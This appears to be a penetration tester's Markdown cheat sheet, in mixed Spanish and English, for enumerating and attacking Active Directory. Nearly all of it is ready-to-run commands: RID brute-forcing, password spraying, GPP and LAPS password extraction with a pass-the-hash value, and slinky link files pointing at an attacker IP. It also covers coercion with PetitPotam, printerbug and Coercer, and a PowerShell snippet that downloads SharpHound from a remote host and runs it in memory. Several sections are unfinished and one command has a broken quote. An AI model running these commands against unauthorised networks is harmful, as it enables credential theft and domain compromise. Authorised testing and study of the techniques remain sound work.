# Enumeracion de Active Directory

Inspired by [Orange Cyberdefense](https://orange-cyberdefense.github.io/ocd-mindmaps/):
and [Mayfly](https://mayfly277.github.io/categories/ad/)

![Mindmap Pentest AD](/Images/image-1.png)

> Default LMHASH aad3b435b51404eeaad3b435b51404ee

## Reconocimiento

### Enumerar AD

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.alux.cc
ldeep ldap -u username -p 'password' -d domain.com -s ldap://dcIP all
```

### Configurar DNS

```bash
systemd-resolve --interface lateralmovement --set-dns DCIP --set-domain domain.com
```

### Enumerate the trusts

```bash
ldeep ldap -u username -p 'password' -d domain.com -s ldap://dcIP trusts
```

### Enumerar SMBs

```bash
crackmapexec smb <ip_range>
crackmapexec smb ip -u user -p pass -M gpp_autologin
Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
```

## Enumeracion de Usuarios

## Possible Users

```bash
# Tool https://gist.github.com/superkojiman/11076951
python3 namemash.py >> usernames.txt
# RID Brute
impacket-lookupsid -no-pass 'guest@domain.com' 20000 -target-ip DCIP
impacket-lookupsid -no-pass 'guest@domain.com' <8000> | grep SidTypeUser | cut -d' ' -f2 | cut -d'\' -f2 | tee users
netexec smb DCIP -u guest -p '' --rid-brute
```

### Null session

```bash
rpcclient -U "" -N $ip
crackmapexec smb $ip --users
net rpc group members 'Domain Users' -W 'alux.cc' -I $ip -u '%'
enum4linux -U $ip | grep 'user:'
```

### OSINT | Username Anarchy | Kerbrute (Pendiente)

[username-anarchy](https://github.com/urbanadventurer/username-anarchy)

```bash
kerbrute userenum -d alux.cc usernames.txt
```




#### Coerced auth smb + ntlmrelayx to ldaps with drop the mic (Pendiente)

## Valid Username

### Password Spraying

```bash
crackmapexec smb -u usernames.txt -p Password123!
kerbrute passwordspray --user-as-pass --dc $ip -d alux.cc users.txt
use auxiliary/scanner/smb/smb_login
crackmapexec smb $ip -u users.txt -p users.txt --no-bruteforce
```

## Valid Credentials

### Check access to computers (Local Admin, PS remote, RDP)

```bash
crackmapexec smb smb.txt -u user -p pass -d domain.com
crackmapexec winrm winrm.txt -u user -p pass -d domain.com
crackmapexec rdp rdp.txt -u user -p pass -d domain.com
```


### Bloodhound

#### Linux

```bash
bloodhound-python -c All -u user -p 'password' -d domain.com --zip -ns dcIp
certipy find -u user@domain.com -p 'password' -dc-ip DCIP -bloodhound
```
> Si da error con `-c All` lo mejor sera usar solo DCOnly

and import this to [bloodhound ly4k version](https://github.com/ly4k/BloodHound)

```bash
./BloodHound  --no-sandbox --disable-dev-shm-usage
```

#### Windows

[SharpHound](https://github.com/BloodHoundAD/SharpHound)

```powershell
.\sharphound.exe -c All -d domain.com
## Memory Execution
$data = (New-Object System.Net.WebClient).DownloadData('http://ip/SharpHound.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Sharphound.Program]::Main("-d domain.com -c all".Split())
```



### ADCS

```bash
certipy find -u user@domain.com -p 'pass' -vulnerable -dc-ip DCIP -stdout > certipy_output.txt
```

### Enum shares

```bash
crackmapexec smb smb.txt -u 'user' -p 'pass' --shares
## Listar smb y archivos
smbmap -r -d 'domain.com' -u 'username' -p 'password' -H ip --depth (default 5) --no-write-check
smbmap -r -d 'domain.com' -u 'username' -p 'password' --host-file listIPs
# Search interesting files inside PC (need access to smb to compoter)
sudo python3 ./scavenger.py smb -t 10.0.0.10 -u administrator -p Password123 -d test.local
sudo python3 ./scavenger.py smb -t smb.txt -u administrator -p Password123 -d test.local
```

### Enume QUOTA

```bash
crackmapexec ldap dcIP -u user -p pass -M maq
ldeep ldap -s ldap://172.16.1.5 -u user -p 'passs' -d corp.local search '(&(objectClass=*)(distinguishedName=DC=corp,DC=local))' 'ms-DS-MachineAccountQuota'
```

```python
import ldap3

target_dn = "DC=corp,DC=local" # change this
domain = "172.16.1.5" # change this
username = "user" # change this
password = "pass" # change this

user = "{}\\{}".format(domain, username)
server = ldap3.Server(domain)
connection = ldap3.Connection(server = server, user = user, password = password, authentication = ldap3.NTLM)
connection.bind()
connection.search(target_dn,"(objectClass=*)", attributes=['ms-DS-MachineAccountQuota'])
print(connection.entries[0])
```

#### Create link 

```bash
crackmapexec smb $ip -u username -p 'pass' -d domain.com -M slinky -o NAME=.thumbs.db SERVER=attackerIP
# Clean up
crackmapexec smb $ip -u username -p 'pass; -d domain.com -M slinky -o NAME=.thumbs.db SERVER=attacker_ip CLEANUP=true
```

### Enum dns

[dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py)
[adidnsdump](https://github.com/dirkjanm/adidnsdump)
```bash
python3 dnstool.py -u 'domain.com\username' -p 'password' --record '*' --action query DCIP
adidnsdump -u 'domain.com\username' -p 'password' pc.domain.com
```

### LAPS

- https://github.com/p0dalirius/pyLAPS
- https://github.com/swisskyrepo/SharpLAPS

```bash
python3 pyLAPS.py --action get -u iamtheadministrator -H 70016778cb0524c799ac25b439bd67e0 -d corp.local --dc-ip 172.16.1.5
```


### Coerce

> Iniciar listener antes 

[Coercer.py](https://github.com/p0dalirius/Coercer)
[PetitPotam.py](https://github.com/topotam/PetitPotam)
[printerbug.py](https://github.com/dirkjanm/krbrelayx/)

```bash
python3 rpcdump.py domain.com/username:Password@target | grep MS-RPRN
#Protocol: [MS-RPRN]: Print System Remote Protocol 
python3 printerbug.py domain.com/username:'Password'@targetIP listenerIP
#Authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions
python3 PetitPotam.py -u 'username' -p 'password' -d 'domain.com' listenerIP targetIP
#Automatically coerce a Windows server to authenticate on an arbitrary machine through many methods
python3 Coercer.py coerce -u 'username' -p 'password' -d 'domain.com' -t targetIP -l listenerIP --always-continue
```

